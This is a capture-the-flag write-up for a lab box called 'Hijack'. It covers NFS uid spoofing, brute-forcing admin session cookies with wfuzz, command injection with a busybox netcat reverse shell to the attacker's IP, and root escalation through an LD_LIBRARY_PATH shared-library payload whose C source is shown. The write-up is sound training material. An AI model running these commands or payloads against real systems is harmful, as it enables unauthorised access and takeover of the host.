# CTF Writeup: Hijack

---

- Step 1: Started with enumeration methodologys, nmap --> 21,22,80,111,2049,42819 port open 
--> found login page on website and sign in page --> created user acc and logged in, but no further functionalities
were unlocked. tried to intercept traffic and login form. --> made sqlmap -r package.txt --dump, but no sql injection possible.
- Step 2: Tried to enumerate hidden dir's in specific ports, but also didn't work --> tried to login with
anonymous user in ftp connection, but also didn't work. 
- Step 3: After being stuck made some research and found out that NFS can be exploited. made showmount -e <target_ip> 
revealed directory mnt/share* --> tried to exploit it by recreating the directory on my local machine
- Step 4: made mkdir share --> sudo mount -t nfs <target_ip>:/mnt/share share, ls -la, to retrieve the data of /mnt/share
in my local share folder. It worked initially, but I didn't had authorization to view the content, the file was locked.
- Step 5: Had to research --> To bypass this you can simply create a user account on your local machine and need to
give him uid=1003 rights to bypass authentification, because the original /mnt/share is owned by a user with uid=1003. --> made sudo useradd hijack --> sudo usermod -u 1003 hijack --> sudo groupmod -g 1003 hijack,
once the user was set I logged in --> made su hijack --> retrieved information --> ftp creds 
- Step 6: logged in with ftp creds --> made ls -la --> found 2 interesting .txt files, 1 with an msg from admin and another with stored passwords.
- Step 7: made get .passwords_list.txt and get .from_admin.txt --> cat'd both of them and retrieved information
apparently login is limited to 5 per ip, so bruteforcing won't be an option, 
- Step 8: After further analyzing webpage, once an user is created it has is own phpsessid cookie --> the password list
with md5 encrypted passwords is most likely the sessionid cookie, we know there is an admin user since the prompt changes
when the password is wrong on "admin" user so the task is to filter out which
session id cookie is the right one for "user: admin". to not do it manually I looked for an script
- Step 9: found one and made --> wfuzz -u http://10.10.162.85/administration.php -w cookies.txt -X POST -b 'PHPSESSID= FUZZ' --hh 51
after retrieving sessionid cookie I created an test acc --> logged in & copied the admin cookie in my current one and 
pressed f5 --> logged in as admin
- Step 10: After accessing and analyzing administration panel, once I prompt an directory or make an command it won't be displayed,
my assumption is that some methods are getting filtered out --> possible bypass to this? tried a lot of symbols out --> with "&" symbol before an command
it's possible to bypass filters --> &ls displayed me files
- Step 11: I wanted to find a revshell to inject, tested out almost all on revshells --> only busybox was working, because there were no symbols.
made &busybox nc 10.21.156.104 1234 -e /bin/bash and started listener --> gained rce --> done shell hardening
- Step 12: retrieved user flag & made sudo -l --> apache function is executable with sudo --> had to make a lot of
research --> LD_LIBRARY_PATH env variable is exploitable if there is sudo rights 
- Step 13: saved precoded .c malware file in /tmp directory --> made /tmp/malware.c

c

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

- Step 14: made cd /tmp --> and made to compile and execute payload 
--> gcc -o /tmp/libcrypt.so.1 -fPIC -shared /tmp/malware.c
--> made sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2 --> got root
and retrieved root flag.

---

## Key Learnings

- Learned about the Concept of NFT (Network File Transfer) and how to bypass authentification
- Learned about a new method to get privileges --> session hijacking / cookie hijacking
- Further strengthened privilege escalation methodology.
- Learned basic stuff about .c scripts 
